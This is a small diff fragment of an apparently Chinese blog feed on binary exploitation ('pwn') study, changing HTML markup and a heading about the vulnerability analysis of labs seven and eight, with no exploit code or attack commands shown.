-<p><img src="/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89.assets/jcc.png" alt="jcc"></p>
 ]]></content>
   </entry>
   <entry>
@@ -1040,10 +1100,9 @@ return head;
 
    printf(&quot;Processed input: %s\n&quot;, buf);
 </code></pre>
-<p>   }</p>
+<p>   }实验七，八漏洞分析</p>
 <pre><code>
-
-# 实验七，八漏洞分析
+# 实验七八漏洞分析
 
 ## 七
 
